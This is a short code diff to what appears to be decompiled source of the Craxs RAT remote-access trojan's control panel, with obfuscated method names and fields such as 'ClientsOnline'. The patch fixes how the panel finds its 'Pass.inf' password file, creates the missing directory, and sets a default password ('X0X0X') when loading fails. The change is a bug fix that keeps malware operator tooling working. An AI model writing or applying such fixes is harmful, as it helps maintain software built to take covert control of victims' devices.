@@ -5499,7 +5499,10 @@ public sealed class Data
 
 	public static void CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhsdkax()
 	{
-		string path = Environment.CurrentDirectory.ToString() + "\\res\\Config\\Pass.inf";
+		// Use the executable's folder, not the working directory: res\ only
+		// exists next to the exe, so a launch from the project root used to
+		// fail and then die in the repair handler below.
+		string path = reso.res_Path + "\\Config\\Pass.inf";
 		imageListLarge = new Collection();
 		LockRemoveCard = new Collection();
 		ClientsOnline = new Collection();
@@ -5515,6 +5518,7 @@ public sealed class Data
 				{
 					if (!File.Exists(path))
 					{
+						Directory.CreateDirectory(Path.GetDirectoryName(path));
 						File.WriteAllText(path, Codes.Encrypt("X0X0X", THEKEY));
 					}
 					string[] array = File.ReadAllLines(path);
@@ -5534,7 +5538,9 @@ public sealed class Data
 			catch (Exception projectError)
 			{
 				ProjectData.SetProjectError(projectError);
+				Directory.CreateDirectory(Path.GetDirectoryName(path));
 				File.WriteAllText(path, Codes.Encrypt("X0X0X", THEKEY));
+				password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", THEKEY), THEKEY);
 				ProjectData.ClearProjectError();
 				try0033_dispatch = 52;
 				continue;
